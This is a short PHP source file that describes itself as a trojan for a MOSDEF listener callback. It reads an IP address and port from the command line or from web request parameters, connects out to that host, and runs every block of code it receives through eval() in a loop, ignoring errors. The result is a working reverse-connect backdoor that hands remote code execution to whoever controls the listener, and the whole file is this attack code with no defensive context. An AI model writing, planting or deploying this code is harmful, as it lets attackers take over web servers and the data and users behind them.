<?

// command line 
// can be called from command line or browser.
// php trojan to interact with mosdef phplistener callback.

$ip   = $argv[1] or $_REQUEST['ip'];
$port = $argv[2] or $_REQUEST['port'];

function read_block($sock) {
   $data=fread($sock,4);
   $size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3});
   $data2="";
   while ($size > 0 ) {
      $data3=fread($sock,$size);
      if ($data3==FALSE) {
         break;
      }
      $data2=$data2.$data3;
      $size-=strlen($data3);
   } 
   return $data2;
}

$f=fsockopen($ip,$port);

if ($f) {
   while (1) {
      $data=read_block($f);
      if ($data=="") {
       break;
      }
      try {
       eval($data);
        }
      catch (Exception $e) {
        //ignore - probably all is lost, but we'll give it a shot.
        }
   }
 }
?>
